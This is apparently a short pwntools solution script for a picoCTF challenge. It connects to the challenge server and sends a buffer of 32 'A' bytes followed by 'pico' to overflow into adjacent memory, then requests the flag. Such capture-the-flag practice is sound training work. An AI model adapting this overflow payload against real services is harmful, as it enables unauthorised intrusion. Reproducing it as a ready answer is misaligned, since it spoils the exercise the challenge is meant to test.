from pwn import *
HOST = "tethys.picoctf.net"
PORT = 60796
with remote(HOST, PORT) as r:
    print(r.recv().decode())
    r.sendline(b"2")
    print(r.recv().decode())
    r.sendline(b"A" * 0x20 + b"pico")
    print(r.recv().decode())
    r.sendline(b"4")
    print(r.recv().decode())